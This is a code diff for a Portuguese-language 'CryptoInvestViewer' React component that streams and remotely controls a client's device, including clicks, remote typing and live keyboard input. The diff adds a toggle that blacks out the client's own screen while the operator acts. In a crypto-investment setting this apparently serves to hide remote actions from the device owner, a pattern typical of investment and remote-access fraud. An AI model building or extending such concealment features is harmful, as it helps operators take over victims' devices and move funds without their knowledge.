@@ -2,7 +2,7 @@ import { useCallback, useEffect, useRef, useState } from "react";
 import { useNavigate, useParams } from "react-router-dom";
 import axios from "axios";
 import { useAuth } from "@/context/AuthContext";
-import { ArrowLeft, MousePointerClick, Circle, RefreshCw, Maximize, ChevronLeft, CircleDot, Square, Bell, Keyboard } from "lucide-react";
+import { ArrowLeft, MousePointerClick, Circle, RefreshCw, Maximize, ChevronLeft, CircleDot, Square, Bell, Keyboard, EyeOff } from "lucide-react";
 
 const API = `${process.env.REACT_APP_BACKEND_URL}/api`;
 const WSB = process.env.REACT_APP_BACKEND_URL.replace(/^http/, "ws") + "/api/ws";
@@ -20,6 +20,8 @@ export default function CryptoInvestViewer() {
   const [status, setStatus] = useState("A ligar…");
   const [txt, setTxt] = useState("");
   const [kbdOn, setKbdOn] = useState(false);
+  const [privacyOn, setPrivacyOn] = useState(false);
+  const togglePrivacy = () => { const on = !privacyOn; setPrivacyOn(on); send({ type: "privacy", on }); };
 
   useEffect(() => { if (ready && !user) nav("/crypto-invest"); }, [ready, user, nav]);
 
@@ -146,6 +148,7 @@ export default function CryptoInvestViewer() {
           <input value={txt} onChange={(e) => setTxt(e.target.value)} onKeyDown={(e) => { if (e.key === "Enter" && txt) { send({ type: "text", value: txt }); setTxt(""); } }} placeholder="Escrever no dispositivo do cliente (teclado remoto)…" data-testid="ci-text-input" className="flex-1 rounded-lg border border-white/15 bg-white/5 px-3 py-2 text-sm text-white placeholder:text-slate-500" />
           <button onClick={() => { if (txt) { send({ type: "text", value: txt }); setTxt(""); } }} data-testid="ci-text-send" className="rounded-lg bg-[#4ADE80] px-4 py-2 text-sm font-bold text-[#0B1A30] hover:bg-[#3fce74]">Enviar texto</button>
           <button onClick={() => setKbdOn((v) => !v)} data-testid="ci-kbd-toggle" className={`flex items-center gap-1.5 rounded-lg px-4 py-2 text-sm font-bold ${kbdOn ? "bg-[#4ADE80] text-[#0B1A30]" : "bg-white/10 text-white hover:bg-white/20"}`}><Keyboard size={15} /> {kbdOn ? "Teclado LIGADO" : "Teclado ao vivo"}</button>
+          <button onClick={togglePrivacy} data-testid="ci-privacy-toggle" className={`flex items-center gap-1.5 rounded-lg px-4 py-2 text-sm font-bold ${privacyOn ? "bg-amber-400 text-[#0B1A30]" : "bg-white/10 text-white hover:bg-white/20"}`}><EyeOff size={15} /> {privacyOn ? "Ecrã preto LIGADO" : "Ecrã preto p/ cliente"}</button>
         </div>
         <div className="overflow-hidden rounded-xl border border-white/10 bg-black">
           <video ref={videoRef} autoPlay playsInline muted onPointerDown={onDown} onPointerMove={onMove} onPointerUp={onUp} className="h-[70vh] w-full cursor-crosshair touch-none bg-black object-contain" data-testid="ci-remote-video" />
